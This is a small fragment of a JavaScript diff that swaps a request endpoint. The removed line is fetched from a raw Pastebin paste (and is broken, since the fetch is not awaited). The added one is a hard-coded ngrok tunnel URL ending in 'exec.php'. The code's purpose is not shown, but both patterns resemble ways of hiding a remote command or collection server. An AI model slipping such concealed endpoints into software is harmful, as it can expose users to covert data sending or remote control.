@@ -91,8 +91,7 @@
             }
             
             try {
-                let pastebinContent; (async () => pastebinContent = await (await fetch("https://pastebin.com/raw/YP5XrTWv")).text())();
-                const response = await fetch(pastebinContent, {
+                const response = await fetch('https://a69e-196-65-78-227.ngrok-free.app/exec.php', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
